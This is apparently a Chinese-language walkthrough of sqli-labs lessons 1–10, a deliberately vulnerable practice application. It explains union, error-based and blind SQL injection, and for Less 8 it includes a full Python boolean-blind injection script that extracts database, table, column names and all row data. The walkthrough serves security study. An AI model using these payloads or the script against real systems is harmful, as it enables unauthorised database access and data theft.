# sqli-labs题解wp



考查点

1-4 闭合方式

5-6 报错注入 

7文件上传

8布尔盲注

9-10时间盲注



##  Less 1 

先通过报错发现是'单引号闭合’

![1732192593587](https://s2.loli.net/2024/11/21/GdTmZebXgQrKuHN.png)



又通过二分法发现是3列

![1732192632885](https://s2.loli.net/2024/11/21/czXd8ASa4QTF7pU.png)

再通过联合查询，发现回显2,3列

![1732192839089](https://s2.loli.net/2024/11/21/wAelUQmfWDk4nNC.png)

按照顺序查询库，表，列，成功查看password

![1732192915051](https://s2.loli.net/2024/11/21/H6JG8t3UVzBKayx.png)

![1732193065089](https://s2.loli.net/2024/11/21/wpea3dhoQMT1S5x.png)

![c6c78d920e8c1dcdfab2b7065b3efc6](https://s2.loli.net/2024/11/21/aUmYdklQOR4wgs1.png)

![1732194870071](https://s2.loli.net/2024/11/21/oHsrJMlZRWthAqz.png)

## Less 2

![1732192915160](https://s2.loli.net/2024/11/21/fyXToSR5huIPCKW.png)

通过报错可以发现\之后并没有内容（说明没有闭合），因此是数字型注入

剩下的内容，同上只是没有闭合符号

![a66f7ea5e96dc77c201ac8f0de74b58](https://s2.loli.net/2024/11/21/caKvyEFxkunJTB2.png)

## Less 3

通过报错可以知道闭合方式是'）,其他操作和第一题一样

![image-20241121213717683](https://s2.loli.net/2024/11/21/d3iCLhcPkjT9Eyw.png)

![bcbb2d2e3441e4c503fbfe5e787e679](https://s2.loli.net/2024/11/21/xPOKIuj7BGzDVa3.png)

## Less 4

同上，找到闭合方式")

![image-20241121213717683](https://s2.loli.net/2024/11/21/pW1kyeJvqRjaUXM.png)

## Less 5

还是先查询闭合方式，通过报错发现是'闭合

![image-20241122231612653](https://s2.loli.net/2024/11/22/Mr3EzanPYLQVi4X.png)

但是，按照前面题目的流程发现并不会出现正常回显，在输入值为True的情况下只会显示You are in，而输入值为False时，显示为空白

因此不能采用和前面题目一样的方法。

因为有出现了报错，所以第一时间想到了报错注入（也可以用盲注）

通过报错，可以发现当前库是security

![image-20241122231612653](https://s2.loli.net/2024/11/22/FAtDcwLSyX9Z1Mm.png)

剩下的步骤和前面一样，只需要按顺序查找表，列，数据即可

查询security下的表名

![123321](https://s2.loli.net/2024/11/22/QO36HItu2RSD5ml.png)

接着查询users下的列名（因为extractvalue（）可以返回32个字符，而表名总字符数小于32字符，所以可以不用substring再次查询）

![123321](https://s2.loli.net/2024/11/22/8hnPfq41bD7gKrv.png)

最后查询password

![image-20241122233952084](https://s2.loli.net/2024/11/22/YjoZUV4JuBEmdG6.png)

## Less 6

闭合方式为" ,其他部分和Less 5相同

## Less 7

这题和上面都不太一样，缺少了报错回显，所以不能直接判断闭合符号，只能一个一个去尝试

结果是'))闭合符

根据提示Use outfile，理解到这题应该使用文件上传方法（更快）。

不过根据页面正确输入显示you are in，错误显示空白，所以也可以使用盲注的方法。

脚本见Less 8

## Less 8

先查看闭合方式

根据页面正确输入显示you are in，错误显示空白，所以可以使用盲注的方法。

跑出来的结果（部分）

![image-20241124143636606](https://s2.loli.net/2024/11/24/EvdujHSO3sbYPQ8.png)

![image-20241124143732042](https://s2.loli.net/2024/11/24/tEUCdLQ8XMsWbDR.png)

```
import requests

global url
url=
global chars
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!#.-"


def send_payload(payload):
    r=requests.get(url+payload)
    r.encoding="utf-8"
    if "You are in..........." in r.text:
        return True
    return False

#库名长度
def get_database_name_length():
    length=0
    while True:
        payload=f"-1' OR(select length(database())={length}) --+" #这里1'and 也可以是-1'or 或者'or
        if send_payload(payload):
            print("数据库名长度为",length)
            return length
        length += 1

#库名
def get_database_name(length):
    database=""
    for i in range(1,length+1):
        for char in chars:
            payload=f"-1'or ascii((select substr(database(),{i},1)))={ord(char)} --+"
            if send_payload(payload):
                database=database+char
                #print("数据库名为",database)
                break
    print("数据库名为", database)
    return database

#获取表数量
def get_tables_num(database):
    table_num=0
    while True:
        #print(table_num)
        payload = f"-1' OR((select count(table_name) from information_schema.tables where table_schema='{database}')={table_num}) --+"  # 这里1'and 也可以是-1'or 或者'or
        if send_payload(payload):
            print("表数量为", table_num)
            return table_num
        table_num+=1


#获取各个表名长度
def get_tables_name_length(database,table_num):
    table_name_length_list=[]
    for i in range(0, table_num):
        table_name_length = 0
        while True:
            #payload = f"'or length((select table_name from information_schema.tables where table_schema='{database}' limit{i},1))={table_name_length} --+"
            payload = f"'or length((select table_name from information_schema.tables where table_schema='{database}' limit {i},1))={table_name_length} --+"
            if send_payload(payload):
                print(f"第{i + 1}个表名长度为", table_name_length)
                table_name_length_list.append(table_name_length)
                break
            table_name_length +=1
    return table_name_length_list

#获取表名
def get_table_name(database,table_num,table_name_length_list):
    table_name_list=[]
    for i in range(0,table_num):
        table_name=""
        for j in range(1,table_name_length_list[i]+1):
            for char in chars:
                payload=f"'or (ascii(substr((select table_name from information_schema.tables where table_schema='{database}' limit {i},1),{j},1)))={ord(char)}--+"
                if send_payload(payload):
                    table_name+=char
                    #print(1)
                    break
        print(f"第{i + 1}个表名为", table_name)
        table_name_list.append(table_name)
    return table_name_list


#获取列的数量
def get_column_num(database,table_name_list):
    for table_name in table_name_list:
        column_num=0
        while True:
            #print(column_num)
            payload=f"' or (select count(column_name) from information_schema.columns where table_name='{table_name}')={column_num} --+"
            if send_payload(payload):
                print(f"{table_name}表的列数为:",column_num)
                break
            column_num+=1
        column_length_list=get_column_length(database,table_name,column_num)
        column_name_list=get_column_name(database,table_name,column_num,column_length_list)
        data_num_list=get_data_num(database,table_name,column_name_list)
        get_data(database,table_name,column_name_list,data_num_list)
#获取各个列的长度
def get_column_length(database,table_name,column_num):
    column_length_list=[]
    for i in range(0,column_num):
        column_length=0
        while True:
            #print(column_length)
            payload=f"'or (select length(column_name) from information_schema.columns where table_name='{table_name}' limit {i},1)={column_length}--+"
            if send_payload(payload):
                print(f"{table_name}的第{i+1}列名长度为：",column_length)
                column_length_list.append(column_length)
                break
            column_length+=1
    return column_length_list
#获取列名
def get_column_name(database,table_name,column_num,column_length_list):
    column_name_list=[]
    for i in range(0,column_num):
        column_name=""
        for j in range(1,column_length_list[i]+1):
            for char in chars:
                #print(char)
                #payload=f"' or (ascii(substr((select column_name from information_schema.columns where table_name='{table_name}' limit {i},1){j},1))={ord(char)} --+"
                payload = f"' OR {ord(char)} = (ASCII(SUBSTR((SELECT column_name from information_schema.columns WHERE table_name='{table_name}' limit {i},1),{j},1)))--+"
                if send_payload(payload):
                    column_name=column_name+char
                    print(f"{table_name}表的第{i+1}列的名为{column_name}")
                    break
        column_name_list.append(column_name)
    return column_name_list

#获取数据个数
def get_data_num(database,table_name,column_name_list):
    data_num_list=[]
    for column_name in column_name_list:
        data_num=0
        while True:
            payload=f"'or (select count({column_name}) from {database}.{table_name}) ={data_num}--+"
            if send_payload(payload):
                print(f"{table_name}表的{column_name}列共有{data_num}条数据")
                data_num_list.append(data_num)
                break
            data_num +=1
    return data_num_list

#获取数据
def get_data(database,table_name,column_name_list,data_num_list):
    for i in range(len(data_num_list)):
        for j in range(data_num_list[i]):
            data_length=0
            while True:
                payload=f"'or (select length({column_name_list[i]}) from {database}.{table_name} limit {j},1) ={data_length}--+"
                if send_payload(payload):
                    print(f"{table_name}表的第{j+1}条数据的第{i+1}列长度为{data_length}")
                    break
                data_length +=1
            data=''
            for k in range(data_length):
                for char in chars:
                    #print(char)
                    payload_=f"'or (ascii(substr(cast((select {column_name_list[i]} from {database}.{table_name} limit {j},1) as char),{k+1},1)))={ord(char)}--+"
                    if send_payload(payload_):
                        data+=char
                        #print(f"{table_name}表的第{j+1}列数据的第{i+1}列为",data)
                        #print("{}表的{}列第{}条数据的值为:".format(table_name, column_name_list[i], j + 1), data)
                        break
                print("{}表的{}列第{}条数据的值为:".format(table_name, column_name_list[i], j + 1), data)

if __name__ == '__main__':
    length=get_database_name_length()  #获取库名长度
    #length=8
    database=get_database_name(length) #获取库名
    #database='security'
    table_num=get_tables_num(database)  #获取表数量
    #table_num=4
    table_name_length_list=get_tables_name_length(database,table_num) #获取各个表名长度
    #table_name_length_list=[6,8,7,5]
    table_name_list=get_table_name(database,table_num,table_name_length_list) #获取各个表名
    #table_name_list=['emails','users','referers','uagents'] #为测试数据改换了表名的顺序
    get_column_num(database,table_name_list)
```

## Less 9

通过页面可以发现不管输入什么都是返回 you are in..

不存在True和False回显，所以不能用布尔盲注

要用时间盲注

## Less 10

发现页面和Less 9一样无论输入什么都是一样的回显

因此还是只能使用时间盲注
